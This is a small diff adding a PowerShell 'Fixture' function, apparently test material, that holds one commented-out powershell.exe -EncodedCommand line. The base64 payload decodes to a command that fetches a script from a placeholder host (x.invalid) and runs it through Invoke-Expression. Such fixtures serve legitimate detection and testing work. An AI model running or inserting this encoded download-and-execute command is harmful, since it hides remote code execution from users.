@@ -1,0 +1,4 @@
+function Fixture {
+    # powershell.exe -EncodedCommand 'SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAAaAB0AHQAcAA6AC8ALwB4AC4AaQBuAHYAYQBsAGkAZAAvAHAAIAB8ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA=='
+}
+    # Commented command shown for reference.
